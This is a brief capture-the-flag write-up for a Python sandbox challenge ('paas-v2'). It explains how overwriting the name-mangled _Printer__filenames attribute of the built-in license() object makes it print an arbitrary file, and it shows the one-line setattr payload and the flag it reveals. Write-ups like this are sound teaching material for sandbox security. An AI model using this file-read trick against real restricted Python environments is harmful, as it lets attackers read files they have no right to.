paas-v2:
in CPython, theres 3 builtin functions (license, credits, copyright) that just print some text
but they're actually all instances of _sitebuiltins.Printer (https://github.com/python/cpython/blob/3.10/Lib/_sitebuiltins.py)
and the printed text comes from files
so you can just overwrite the "__filenames" attribute to change what file gets read when you call license()
the "_Printer" part at the beginning is just to deal with name-mangling on attributes prefixed with double underscores


solve::
> setattr(license, input(), list((input(), )))
_Printer__filenames
flag
> license()
flag{i_solved_it}
